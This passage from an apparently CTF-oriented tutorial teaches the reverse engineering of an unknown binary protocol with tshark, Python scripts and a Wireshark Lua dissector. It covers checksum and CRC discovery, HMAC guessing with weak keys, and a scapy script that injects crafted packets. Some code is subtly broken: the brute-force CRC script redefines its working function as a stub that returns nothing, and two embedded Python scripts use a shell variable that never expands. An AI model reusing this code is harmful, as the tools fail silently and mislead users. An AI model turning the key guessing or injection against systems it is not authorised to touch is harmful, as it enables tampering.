    echo "Actual: $len, First 2 bytes: $len_field"
done | head -20

# Test different byte orders (big-endian vs little-endian)
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 4" -T fields -e tcp.len -e tcp.payload | \
python3 << 'EOF'
import sys

for line in sys.stdin:
    parts = line.strip().split('\t')
    if len(parts) != 2:
        continue
    actual_len = int(parts[0])
    payload = parts[1]
    
    if len(payload) >= 4:
        # Big-endian
        be_len = int(payload[0:4], 16)
        # Little-endian
        le_len = int(payload[2:4] + payload[0:2], 16)
        
        print(f"Actual: {actual_len}, BE: {be_len}, LE: {le_len}")
EOF
```

### Repeating Pattern Analysis

**Sequence Detection:**

```bash
# Look for sequence numbers or counters
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 4" -T fields -e frame.number -e tcp.payload | \
awk '{print $1, substr($2,1,8)}' | head -20

# Check for incrementing values
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys

prev = None
for line in sys.stdin:
    payload = line.strip()
    if len(payload) >= 8:
        value = int(payload[0:8], 16)
        if prev is not None:
            diff = value - prev
            print(f"Value: {value}, Diff: {diff}")
        prev = value
EOF
```

**Periodic Beaconing:**

```bash
# Analyze timing patterns
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}' | \
python3 << 'EOF'
import sys
from statistics import mean, stdev

deltas = [float(x) for x in sys.stdin if x.strip()]
if deltas:
    print(f"Mean interval: {mean(deltas):.4f}s")
    print(f"Std deviation: {stdev(deltas):.4f}s" if len(deltas) > 1 else "N/A")
    print(f"Min: {min(deltas):.4f}s, Max: {max(deltas):.4f}s")
EOF
```

## Field Boundary Identification

### Manual Packet Alignment

**Hex Dump Analysis:**

```bash
# Extract and format payload for visual analysis
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -10 | while read line; do
    echo "$line" | xxd -r -p | xxd -g 1 -c 32
    echo "---"
done

# Side-by-side comparison of packets
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e frame.number -e tcp.payload | \
head -5 | while IFS=$'\t' read num payload; do
    echo "Packet $num:"
    echo "$payload" | fold -w 64
    echo
done
```

### Differential Analysis

**Compare Consecutive Packets:**

```bash
# Create comparison script
cat > compare_packets.py << 'EOF'
#!/usr/bin/env python3
import sys

packets = []
for line in sys.stdin:
    packets.append(line.strip())

for i in range(len(packets)-1):
    p1 = packets[i]
    p2 = packets[i+1]
    
    if len(p1) == len(p2):
        print(f"\nComparing packet {i} and {i+1}:")
        changes = []
        for j in range(0, min(len(p1), len(p2)), 2):
            if p1[j:j+2] != p2[j:j+2]:
                changes.append(f"Offset {j//2}: {p1[j:j+2]} -> {p2[j:j+2]}")
        
        if changes:
            for change in changes[:10]:  # Show first 10 changes
                print(f"  {change}")
        else:
            print("  No changes")
EOF

chmod +x compare_packets.py

# Run comparison
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -10 | ./compare_packets.py
```

**Field Variance Analysis:**

```bash
# Identify static vs dynamic fields
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys

packets = [line.strip() for line in sys.stdin]
if not packets:
    print("No packets")
    sys.exit()

min_len = min(len(p) for p in packets)
print(f"Analyzing {len(packets)} packets, minimum length: {min_len//2} bytes\n")

for offset in range(0, min_len, 2):
    values = set(p[offset:offset+2] for p in packets if len(p) > offset+1)
    
    if len(values) == 1:
        print(f"Offset {offset//2:3d}: STATIC  [{list(values)[0]}]")
    elif len(values) <= 5:
        print(f"Offset {offset//2:3d}: LOW_VAR [{len(values)} values: {', '.join(sorted(values)[:5])}]")
    else:
        print(f"Offset {offset//2:3d}: DYNAMIC [{len(values)} unique values]")
    
    if offset >= 40:  # Limit output
        print("... (showing first 20 bytes)")
        break
EOF
```

### Type-Based Field Recognition

**Timestamp Detection:**

```bash
# Check for Unix timestamps (32-bit, 4 bytes)
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len >= 4" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys
from datetime import datetime

for line in sys.stdin:
    payload = line.strip()
    for offset in range(0, min(len(payload)-8, 32), 2):
        # Try big-endian
        hex_val = payload[offset:offset+8]
        try:
            timestamp = int(hex_val, 16)
            # Check if reasonable timestamp (2020-2030)
            if 1577836800 <= timestamp <= 1893456000:
                dt = datetime.fromtimestamp(timestamp)
                print(f"Offset {offset//2}: Possible timestamp (BE) = {dt}")
        except:
            pass
        
        # Try little-endian
        if len(hex_val) == 8:
            le_hex = ''.join([hex_val[i:i+2] for i in range(6, -1, -2)])
            try:
                timestamp = int(le_hex, 16)
                if 1577836800 <= timestamp <= 1893456000:
                    dt = datetime.fromtimestamp(timestamp)
                    print(f"Offset {offset//2}: Possible timestamp (LE) = {dt}")
            except:
                pass
    break  # Only check first packet
EOF
```

**IP Address Detection:**

```bash
# Search for IP addresses in payload
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len >= 4" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys

for line in sys.stdin:
    payload = line.strip()
    for offset in range(0, min(len(payload)-8, 64), 2):
        hex_val = payload[offset:offset+8]
        if len(hex_val) == 8:
            try:
                # Convert to dotted decimal
                octets = [str(int(hex_val[i:i+2], 16)) for i in range(0, 8, 2)]
                ip = '.'.join(octets)
                # Check if looks like valid IP (simple heuristic)
                if all(0 <= int(o) <= 255 for o in octets):
                    print(f"Offset {offset//2}: Possible IP = {ip}")
            except:
                pass
    break  # Only check first packet
EOF
```

### Protocol Specification Reconstruction

**Create Field Map Template:**

```bash
# Generate analysis template
cat > protocol_template.py << 'EOF'
#!/usr/bin/env python3
import sys

class ProtocolField:
    def __init__(self, offset, length, name, field_type):
        self.offset = offset
        self.length = length
        self.name = name
        self.field_type = field_type
    
    def parse(self, data):
        hex_data = data[self.offset*2:(self.offset+self.length)*2]
        if self.field_type == 'uint16_be':
            return int(hex_data, 16)
        elif self.field_type == 'uint32_be':
            return int(hex_data, 16)
        elif self.field_type == 'ascii':
            return bytes.fromhex(hex_data).decode('ascii', errors='ignore')
        else:
            return hex_data

# Define your protocol structure here (modify based on analysis)
protocol_fields = [
    ProtocolField(0, 2, "Magic", "hex"),
    ProtocolField(2, 1, "Version", "uint8"),
    ProtocolField(3, 1, "Type", "uint8"),
    ProtocolField(4, 2, "Length", "uint16_be"),
    # Add more fields as discovered
]

for line in sys.stdin:
    payload = line.strip()
    print(f"\nParsing packet ({len(payload)//2} bytes):")
    for field in protocol_fields:
        if len(payload) >= (field.offset + field.length) * 2:
            value = field.parse(payload)
            print(f"  {field.name:15s} @ offset {field.offset:2d}: {value}")
EOF

chmod +x protocol_template.py

# Test on captured packets
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -5 | ./protocol_template.py
```

## Checksum Calculation

### Checksum Algorithm Identification

**Common Checksum Types:**

```bash
# Extract potential checksum locations (often at end or after header)
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys

def test_checksums(data_hex):
    data = bytes.fromhex(data_hex)
    
    # Simple sum
    simple_sum = sum(data) & 0xFF
    
    # XOR checksum
    xor_sum = 0
    for byte in data:
        xor_sum ^= byte
    
    # Fletcher-16
    sum1 = sum2 = 0
    for byte in data:
        sum1 = (sum1 + byte) % 255
        sum2 = (sum2 + sum1) % 255
    fletcher16 = (sum2 << 8) | sum1
    
    # CRC8
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = (crc << 1) ^ 0x07
            else:
                crc <<= 1
            crc &= 0xFF
    
    return {
        'simple_sum': f"{simple_sum:02x}",
        'xor': f"{xor_sum:02x}",
        'fletcher16': f"{fletcher16:04x}",
        'crc8': f"{crc:02x}"
    }

for line in sys.stdin:
    payload = line.strip()
    if len(payload) > 8:
        # Test without last byte (assuming it's the checksum)
        data = payload[:-2]
        last_byte = payload[-2:]
        
        print(f"\nPayload (last byte: {last_byte}):")
        checksums = test_checksums(data)
        
        for algo, value in checksums.items():
            match = "MATCH!" if value == last_byte.lower() else ""
            print(f"  {algo:12s}: {value} {match}")
        
        break  # Test first packet only
EOF
```

### CRC Calculation

**CRC-16 Implementation:**

```bash
cat > crc_calculator.py << 'EOF'
#!/usr/bin/env python3
import sys

def crc16_ccitt(data, poly=0x1021, init=0xFFFF):
    """CRC-16-CCITT (common in protocols)"""
    crc = init
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ poly
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc

def crc16_modbus(data):
    """CRC-16 Modbus"""
    crc = 0xFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x0001:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return crc

def crc16_xmodem(data):
    """CRC-16 XMODEM"""
    crc = 0
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc

for line in sys.stdin:
    payload = line.strip()
    data = bytes.fromhex(payload[:-4])  # Assume last 2 bytes are CRC
    expected = payload[-4:]
    
    print(f"\nTesting CRC algorithms (expected: {expected}):")
    
    crc_ccitt = crc16_ccitt(data)
    print(f"  CRC-16-CCITT:  {crc_ccitt:04x} {'MATCH!' if f'{crc_ccitt:04x}' == expected.lower() else ''}")
    
    crc_modbus = crc16_modbus(data)
    print(f"  CRC-16-Modbus: {crc_modbus:04x} {'MATCH!' if f'{crc_modbus:04x}' == expected.lower() else ''}")
    
    crc_xmodem = crc16_xmodem(data)
    print(f"  CRC-16-XMODEM: {crc_xmodem:04x} {'MATCH!' if f'{crc_xmodem:04x}' == expected.lower() else ''}")
    
    break  # Test first packet
EOF

chmod +x crc_calculator.py

tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 4" -T fields -e tcp.payload | \
./crc_calculator.py
```

**CRC-32 Testing:**

```bash
# Test CRC-32 (common in file transfers, network protocols)
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 4" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys
import zlib

for line in sys.stdin:
    payload = line.strip()
    if len(payload) > 8:
        # Assume last 4 bytes are CRC-32
        data = bytes.fromhex(payload[:-8])
        expected = payload[-8:]
        
        # Calculate CRC-32
        crc32 = zlib.crc32(data) & 0xFFFFFFFF
        
        # Test both byte orders
        crc32_be = f"{crc32:08x}"
        crc32_le = ''.join([crc32_be[i:i+2] for i in range(6, -1, -2)])
        
        print(f"\nExpected CRC: {expected}")
        print(f"CRC-32 (BE):  {crc32_be} {'MATCH!' if crc32_be == expected.lower() else ''}")
        print(f"CRC-32 (LE):  {crc32_le} {'MATCH!' if crc32_le == expected.lower() else ''}")
        
        break
EOF
```

### Checksum Location Verification

**Sliding Window Checksum Test:**

```bash
cat > checksum_finder.py << 'EOF'
#!/usr/bin/env python3
import sys

def simple_checksum(data):
    """Various simple checksums"""
    results = {}
    
    # 8-bit sum
    results['sum8'] = sum(data) & 0xFF
    
    # XOR
    xor = 0
    for b in data:
        xor ^= b
    results['xor8'] = xor
    
    # Two's complement
    results['twos_comp'] = (-sum(data)) & 0xFF
    
    return results

for line in sys.stdin:
    payload = line.strip()
    data_bytes = bytes.fromhex(payload)
    
    print(f"\nSearching for checksum in {len(data_bytes)}-byte payload:")
    print(f"Full payload: {payload[:40]}...")
    
    # Test each byte position as potential checksum location
    for checksum_pos in range(len(data_bytes)):
        # Data excludes the checksum byte itself
        data_without_checksum = data_bytes[:checksum_pos] + data_bytes[checksum_pos+1:]
        actual_byte = data_bytes[checksum_pos]
        
        checksums = simple_checksum(data_without_checksum)
        
        for algo, calc_value in checksums.items():
            if calc_value == actual_byte:
                print(f"  MATCH at offset {checksum_pos}: {algo} = {calc_value:02x}")
    
    break  # Test first packet only
EOF

chmod +x checksum_finder.py

tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -1 | ./checksum_finder.py
```

### Checksum Field Validation

**Verify Across Multiple Packets:**

```bash
cat > validate_checksum.py << 'EOF'
#!/usr/bin/env python3
import sys

def calculate_checksum(data_hex, checksum_offset, checksum_len, algo='xor8'):
    """Calculate checksum excluding the checksum field itself"""
    data = bytes.fromhex(data_hex)
    
    # Extract data excluding checksum field
    data_before = data[:checksum_offset]
    data_after = data[checksum_offset + checksum_len:]
    data_for_calc = data_before + data_after
    
    if algo == 'xor8':
        result = 0
        for b in data_for_calc:
            result ^= b
        return f"{result:02x}"
    elif algo == 'sum8':
        return f"{sum(data_for_calc) & 0xFF:02x}"
    elif algo == 'twos_comp':
        return f"{(-sum(data_for_calc)) & 0xFF:02x}"
    
    return None

# Configuration - adjust based on your findings
CHECKSUM_OFFSET = 10  # byte offset
CHECKSUM_LENGTH = 1   # bytes
ALGORITHM = 'xor8'    # xor8, sum8, twos_comp

valid_count = 0
invalid_count = 0

for line in sys.stdin:
    payload = line.strip()
    
    if len(payload) < (CHECKSUM_OFFSET + CHECKSUM_LENGTH) * 2:
        continue
    
    # Extract actual checksum from packet
    actual_checksum = payload[CHECKSUM_OFFSET*2:(CHECKSUM_OFFSET+CHECKSUM_LENGTH)*2]
    
    # Calculate expected checksum
    calculated = calculate_checksum(payload, CHECKSUM_OFFSET, CHECKSUM_LENGTH, ALGORITHM)
    
    if calculated == actual_checksum:
        valid_count += 1
        print(f"✓ Valid: {actual_checksum}")
    else:
        invalid_count += 1
        print(f"✗ Invalid: expected {calculated}, got {actual_checksum}")

print(f"\nResults: {valid_count} valid, {invalid_count} invalid")
if valid_count > 0 and invalid_count == 0:
    print("Checksum validation: CONFIRMED")
EOF

chmod +x validate_checksum.py

tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
head -20 | ./validate_checksum.py
```

### Advanced: Custom Checksum Algorithm Discovery

**Brute-Force Checksum Parameters:**

```bash
cat > bruteforce_checksum.py << 'EOF'
#!/usr/bin/env python3
import sys

def test_crc_variants(data, expected):
    """Test various CRC polynomials and initial values"""
    
    common_polynomials = {
        'CRC-8': 0x07,
        'CRC-8-CCITT': 0x07,
        'CRC-8-Dallas': 0x31,
        'CRC-16-IBM': 0x8005,
        'CRC-16-CCITT': 0x1021,
        'CRC-16-DNP': 0x3D65,
    }
    
    init_values = [0x00, 0xFF, 0xFFFF]
    
    results = []
    
    for poly_name, poly in common_polynomials.items():
        for init in init_values:
            # Try different bit widths
            if poly <= 0xFF:  # 8-bit CRC
                crc = init & 0xFF
                for byte in data:
                    crc ^= byte
                    for _ in range(8):
                        if crc & 0x80:
                            crc = (crc << 1) ^ poly
                        else:
                            crc <<= 1
                        crc &= 0xFF
                
                if f"{crc:02x}" == expected.lower():
                    results.append(f"{poly_name} (init={init:02x}): MATCH!")
            
            else:  # 16-bit CRC
                crc = init & 0xFFFF
                for byte in data:
                    crc ^= (byte << 8)
                    for _ in range(8):
                        if crc & 0x8000:
                            crc = (crc << 1) ^ poly
                        else:
                            crc <<= 1
                        crc &= 0xFFFF
                
                if f"{crc:04x}" == expected.lower():
                    results.append(f"{poly_name} (init={init:04x}): MATCH!")
    
    return results

import sys

def test_crc_variants(data, expected):
    """
    Test different CRC variants against the expected checksum.
    
    :param data: The data to test.
    :param expected: The expected checksum.
    :return: A list of matching CRC variants.
    """
    # This is a placeholder for the actual implementation
    # It should return a list of matching CRC variants
    return []

# Read first packet to test
for line in sys.stdin:
    payload = line.strip()
    
    # Try different checksum positions and lengths
    for cksum_len in [1, 2]:
        # Test 1-byte and 2-byte checksums
        for offset in range(0, min(len(payload) // 2 - cksum_len, 20), 1):
            # Calculate data and expected checksum
            data = bytes.fromhex(payload[:offset * 2] + payload[(offset + cksum_len) * 2:])
            expected = payload[offset * 2:(offset + cksum_len) * 2]
            
            # Test CRC variants
            matches = test_crc_variants(data, expected)
            
            # Print matches
            if matches:
                print(f"\nChecksum at offset {offset} ({cksum_len} bytes): {expected}")
                for match in matches:
                    print(f"  {match}")
        
        break  # Test first packet only

print("\nTo test more packets, remove the 'break' statement")
EOF

chmod +x bruteforce_checksum.py

tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload |  
head -1 | ./bruteforce_checksum.py
````

### Message Authentication Code (MAC) Detection

**HMAC Pattern Recognition:**
```bash
# Check for HMAC-like structures (typically 16-32 bytes)
tshark -r capture.pcap -Y "tcp.stream eq 0 && tcp.len > 0" -T fields -e tcp.payload | \
python3 << 'EOF'
import sys
import hashlib
import hmac

def test_hmac(data, mac_value, key_guess):
    """Test if MAC matches HMAC with guessed key"""
    
    algorithms = {
        'md5': hashlib.md5,
        'sha1': hashlib.sha1,
        'sha256': hashlib.sha256,
    }
    
    matches = []
    
    for algo_name, algo in algorithms.items():
        try:
            calculated = hmac.new(key_guess, data, algo).hexdigest()
            
            # Check full match
            if calculated == mac_value.lower():
                matches.append(f"{algo_name.upper()}: FULL MATCH")
            # Check truncated match (common practice)
            elif calculated[:len(mac_value)] == mac_value.lower():
                matches.append(f"{algo_name.upper()}: TRUNCATED MATCH")
        except:
            pass
    
    return matches

# Common test keys in CTF scenarios
test_keys = [
    b'key',
    b'secret',
    b'password',
    b'admin',
    b'\x00' * 16,  # Null key
]

for line in sys.stdin:
    payload = line.strip()
    
    # Test last 32 bytes as potential HMAC-SHA256
    if len(payload) >= 64:
        data = bytes.fromhex(payload[:-64])
        mac = payload[-64:]
        
        print(f"Testing last 32 bytes as MAC: {mac}")
        
        for key in test_keys:
            matches = test_hmac(data, mac, key)
            if matches:
                print(f"\nKey '{key.decode('ascii', errors='ignore')}' ({key.hex()}):")
                for match in matches:
                    print(f"  {match}")
    
    break  # Test first packet
EOF
````

### Checksum Correction and Packet Crafting

**Recalculate Checksum for Modified Packets:**

```bash
cat > recalculate_checksum.py << 'EOF'
#!/usr/bin/env python3
import sys

def calculate_xor_checksum(data):
    """Calculate XOR checksum"""
    result = 0
    for byte in data:
        result ^= byte
    return result

def insert_checksum(payload_hex, checksum_offset, new_data_hex=None):
    """
    Modify payload and recalculate checksum
    
    Args:
        payload_hex: Original packet as hex string
        checksum_offset: Byte offset of checksum field
        new_data_hex: Optional modified data to insert
    """
    if new_data_hex:
        # Replace portion of payload with new data
        # (customize based on your needs)
        payload_hex = payload_hex[:20] + new_data_hex + payload_hex[20+len(new_data_hex):]
    
    # Convert to bytes
    payload_bytes = bytearray.fromhex(payload_hex)
    
    # Calculate checksum excluding checksum field
    data_for_checksum = payload_bytes[:checksum_offset] + payload_bytes[checksum_offset+1:]
    new_checksum = calculate_xor_checksum(data_for_checksum)
    
    # Update checksum in payload
    payload_bytes[checksum_offset] = new_checksum
    
    return payload_bytes.hex()

# Example usage
if len(sys.argv) > 1:
    original_payload = sys.argv[1]
    checksum_offset = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    
    print(f"Original payload: {original_payload}")
    print(f"Checksum offset: {checksum_offset}")
    
    corrected = insert_checksum(original_payload, checksum_offset)
    print(f"Corrected payload: {corrected}")
else:
    print("Usage: python3 recalculate_checksum.py <hex_payload> <checksum_offset>")
EOF

chmod +x recalculate_checksum.py
```

**Packet Injection with Correct Checksum:**

```bash
cat > inject_packet.sh << 'EOF'
#!/bin/bash
# Inject crafted packet with corrected checksum

INTERFACE="eth0"
DEST_IP="192.168.1.100"
DEST_PORT="9999"

# Your custom payload (modify as needed)
CUSTOM_DATA="deadbeef"

# Calculate checksum and build packet (example using scapy)
python3 << PYTHON
from scapy.all import *

def craft_packet_with_checksum(data_hex):
    """Craft packet with correct checksums"""
    
    # Build packet layers
    ip_layer = IP(dst="$DEST_IP")
    tcp_layer = TCP(dport=int("$DEST_PORT"), flags="PA")
    
    # Custom payload
    payload = bytes.fromhex(data_hex)
    
    # Scapy automatically calculates IP and TCP checksums
    packet = ip_layer / tcp_layer / payload
    
    return packet

packet = craft_packet_with_checksum("$CUSTOM_DATA")
print(f"Crafted packet: {packet.summary()}")

# Send packet
send(packet, iface="$INTERFACE", verbose=True)
PYTHON
EOF

chmod +x inject_packet.sh
```

### Protocol Dissector Development

**Create Wireshark Lua Dissector:**

```bash
cat > custom_protocol.lua << 'EOF'
-- Custom protocol dissector based on reverse engineering findings
-- Place in: ~/.local/lib/wireshark/plugins/

custom_proto = Proto("CustomProto", "Custom Protocol")

-- Define protocol fields based on analysis
local f_magic = ProtoField.uint16("custom.magic", "Magic Number", base.HEX)
local f_version = ProtoField.uint8("custom.version", "Version", base.DEC)
local f_type = ProtoField.uint8("custom.type", "Message Type", base.HEX)
local f_length = ProtoField.uint16("custom.length", "Length", base.DEC)
local f_checksum = ProtoField.uint8("custom.checksum", "Checksum", base.HEX)
local f_payload = ProtoField.bytes("custom.payload", "Payload")

custom_proto.fields = {f_magic, f_version, f_type, f_length, f_checksum, f_payload}

-- Message type mapping (discovered during analysis)
local msg_types = {
    [0x01] = "Request",
    [0x02] = "Response",
    [0x03] = "Keepalive",
    [0xFF] = "Error"
}

function custom_proto.dissector(buffer, pinfo, tree)
    -- Check if packet is large enough
    if buffer:len() < 6 then return end
    
    pinfo.cols.protocol = "CustomProto"
    
    local subtree = tree:add(custom_proto, buffer(), "Custom Protocol Data")
    
    -- Parse header fields (adjust offsets based on your analysis)
    local magic = buffer(0, 2):uint()
    subtree:add(f_magic, buffer(0, 2))
    
    local version = buffer(2, 1):uint()
    subtree:add(f_version, buffer(2, 1))
    
    local msg_type = buffer(3, 1):uint()
    local type_tree = subtree:add(f_type, buffer(3, 1))
    if msg_types[msg_type] then
        type_tree:append_text(" (" .. msg_types[msg_type] .. ")")
        pinfo.cols.info = msg_types[msg_type]
    end
    
    local length = buffer(4, 2):uint()
    subtree:add(f_length, buffer(4, 2))
    
    -- Verify checksum (implement your algorithm)
    if buffer:len() > 6 then
        local checksum_offset = 6  -- Adjust based on your protocol
        subtree:add(f_checksum, buffer(checksum_offset, 1))
        
        -- Calculate and verify (example: XOR checksum)
        local calculated_checksum = 0
        for i = 0, checksum_offset - 1 do
            calculated_checksum = bit32.bxor(calculated_checksum, buffer(i, 1):uint())
        end
        for i = checksum_offset + 1, buffer:len() - 1 do
            calculated_checksum = bit32.bxor(calculated_checksum, buffer(i, 1):uint())
        end
        
        local actual_checksum = buffer(checksum_offset, 1):uint()
        if calculated_checksum == actual_checksum then
            subtree:add(buffer(checksum_offset, 1), "Checksum: VALID")
        else
            subtree:add(buffer(checksum_offset, 1), 
                       string.format("Checksum: INVALID (expected 0x%02x)", calculated_checksum))
        end
        
        -- Parse payload
        if buffer:len() > checksum_offset + 1 then
            subtree:add(f_payload, buffer(checksum_offset + 1))
        end
    end
end

-- Register dissector on specific port (adjust based on your capture)
local tcp_port = DissectorTable.get("tcp.port")
tcp_port:add(9999, custom_proto)  -- Replace 9999 with actual port
EOF

# Install dissector
mkdir -p ~/.local/lib/wireshark/plugins/
cp custom_protocol.lua ~/.local/lib/wireshark/plugins/

# Reload Wireshark or use:
# Analyze -> Reload Lua Plugins
```

### Automated Protocol Analysis Framework

**Comprehensive Analysis Script:**

```bash
cat > analyze_protocol.sh << 'EOF'
#!/bin/bash

PCAP_FILE="$1"
STREAM_ID="${2:-0}"
OUTPUT_DIR="protocol_analysis"

if [ -z "$PCAP_FILE" ]; then
    echo "Usage: $0 <pcap_file> [stream_id]"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] Analyzing unknown protocol in $PCAP_FILE (stream $STREAM_ID)"

# Step 1: Extract stream
echo "[*] Extracting TCP stream $STREAM_ID..."
tshark -r "$PCAP_FILE" -Y "tcp.stream eq $STREAM_ID" -w "$OUTPUT_DIR/stream.pcap"

# Step 2: Extract payloads
echo "[*] Extracting payloads..."
tshark -r "$OUTPUT_DIR/stream.pcap" -Y "tcp.len > 0" -T fields -e tcp.payload \
    > "$OUTPUT_DIR/payloads.txt"

# Step 3: Packet statistics
echo "[*] Gathering packet statistics..."
tshark -r "$OUTPUT_DIR/stream.pcap" -T fields -e frame.len | \
    python3 << 'PYTHON' > "$OUTPUT_DIR/length_stats.txt"
import sys
from collections import Counter

lengths = [int(line.strip()) for line in sys.stdin]
counter = Counter(lengths)

print("Packet Length Distribution:")
for length, count in sorted(counter.items()):
    print(f"  {length:4d} bytes: {count:3d} packets")

print(f"\nTotal packets: {len(lengths)}")
print(f"Unique lengths: {len(counter)}")
print(f"Min: {min(lengths)}, Max: {max(lengths)}")
PYTHON

# Step 4: Entropy analysis
echo "[*] Calculating entropy..."
python3 << 'PYTHON' > "$OUTPUT_DIR/entropy.txt"
import math
from collections import Counter

with open("$OUTPUT_DIR/payloads.txt", 'r') as f:
    payloads = [bytes.fromhex(line.strip()) for line in f if line.strip()]

for i, payload in enumerate(payloads[:10]):  # First 10 packets
    if len(payload) > 0:
        counter = Counter(payload)
        entropy = -sum((count/len(payload)) * math.log2(count/len(payload)) 
                      for count in counter.values())
        print(f"Packet {i}: {entropy:.4f} bits/byte ({'encrypted' if entropy > 7 else 'cleartext'})")
PYTHON

# Step 5: Field variance analysis
echo "[*] Analyzing field variance..."
python3 << 'PYTHON' > "$OUTPUT_DIR/field_variance.txt"
with open("$OUTPUT_DIR/payloads.txt", 'r') as f:
    packets = [line.strip() for line in f if line.strip()]

if not packets:
    print("No packets to analyze")
else:
    min_len = min(len(p) for p in packets)
    print(f"Analyzing first {min_len//2} bytes across {len(packets)} packets\n")
    
    for offset in range(0, min(min_len, 40), 2):
        values = set(p[offset:offset+2] for p in packets if len(p) > offset+1)
        
        if len(values) == 1:
            status = "STATIC "
        elif len(values) <= 3:
            status = "LOW_VAR"
        else:
            status = "DYNAMIC"
        
        sample_values = ', '.join(sorted(list(values))[:3])
        print(f"Offset {offset//2:3d}: {status} [{len(values):3d} values] e.g., {sample_values}")
PYTHON

# Step 6: Checksum detection
echo "[*] Searching for checksums..."
head -1 "$OUTPUT_DIR/payloads.txt" | python3 << 'PYTHON' > "$OUTPUT_DIR/checksum_candidates.txt"
import sys

line = sys.stdin.read().strip()
if line:
    data = bytes.fromhex(line)
    
    print("Testing checksum algorithms on first packet:\n")
    
    for cksum_pos in range(len(data)):
        test_data = data[:cksum_pos] + data[cksum_pos+1:]
        actual = data[cksum_pos]
        
        # XOR checksum
        xor_sum = 0
        for b in test_data:
            xor_sum ^= b
        
        if xor_sum == actual:
            print(f"Offset {cksum_pos}: XOR checksum MATCH (0x{actual:02x})")
        
        # Simple sum
        if (sum(test_data) & 0xFF) == actual:
            print(f"Offset {cksum_pos}: SUM checksum MATCH (0x{actual:02x})")
PYTHON

# Step 7: Generate report
echo "[*] Generating analysis report..."
cat > "$OUTPUT_DIR/REPORT.txt" << 'REPORT'
Protocol Analysis Report
========================

Files generated:
- stream.pcap: Isolated TCP stream
- payloads.txt: Raw payload data (hex)
- length_stats.txt: Packet length distribution
- entropy.txt: Entropy analysis (encryption detection)
- field_variance.txt: Static vs dynamic field identification
- checksum_candidates.txt: Potential checksum locations

Analysis Steps:
1. Review length_stats.txt for protocol structure patterns
2. Check entropy.txt to determine if encryption is used
3. Examine field_variance.txt to identify header boundaries
4. Use checksum_candidates.txt to locate integrity fields
5. Open stream.pcap in Wireshark for detailed inspection

Next Steps:
- Create protocol specification document
- Develop custom Wireshark dissector
- Test checksum algorithms on multiple packets
- Reverse engineer message type meanings
REPORT

cat "$OUTPUT_DIR/length_stats.txt" >> "$OUTPUT_DIR/REPORT.txt"
echo -e "\n---\n" >> "$OUTPUT_DIR/REPORT.txt"
cat "$OUTPUT_DIR/entropy.txt" >> "$OUTPUT_DIR/REPORT.txt"

echo "[+] Analysis complete! Results in $OUTPUT_DIR/"
echo "[+] Review $OUTPUT_DIR/REPORT.txt for summary"
EOF

chmod +x analyze_protocol.sh

# Usage example:
# ./analyze_protocol.sh capture.pcap 0
```

### Important Validation Techniques

**Cross-Reference Multiple Streams:**

```bash
# Compare protocol behavior across different TCP streams
for stream in 0 1 2 3 4; do
    echo "=== Stream $stream ==="
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -T fields -e tcp.payload | \
    head -1 | xxd -r -p | xxd -g 1 -c 16 | head -3
done
```

**Temporal Analysis:**

```bash
# Check if protocol behavior changes over time
tshark -r capture.pcap -Y "tcp.stream eq 0" -T fields \
    -e frame.time_relative -e frame.len -e tcp.payload | \
awk '{print int($1/60), $2, substr($3,1,16)}' | \
head -20
# Groups by minute - look for behavioral patterns
```

### Important Related Topics

- **State Machine Reconstruction**: Building protocol state diagrams from observed transitions
- **Binary Protocol Fuzzing**: Testing discovered protocol structure with malformed inputs
- **Traffic Generation**: Creating valid protocol traffic based on reverse-engineered specifications
- **Encryption Detection and Analysis**: Identifying cryptographic primitives in unknown protocols
- **Protocol Fingerprinting**: Creating signatures for protocol identification in mixed traffic

---

## Length Field Analysis

### Fundamentals of Length Fields

**Purpose and Placement**: Length fields specify the size of variable-length data structures in protocol messages. Common patterns include:

- **Prefix Length**: Field appears before the data it describes
- **Suffix Length**: Field appears after data (rare)
- **Total vs Payload Length**: Some specify total message size, others only payload
- **Implicit Length**: Determined by packet boundaries or delimiters

**Common Encoding Schemes**:

```
8-bit length:  [0x0A] → 10 bytes follow
16-bit length: [0x00 0x64] → 100 bytes (big-endian)
               [0x64 0x00] → 100 bytes (little-endian)
32-bit length: [0x00 0x00 0x04 0x00] → 1024 bytes
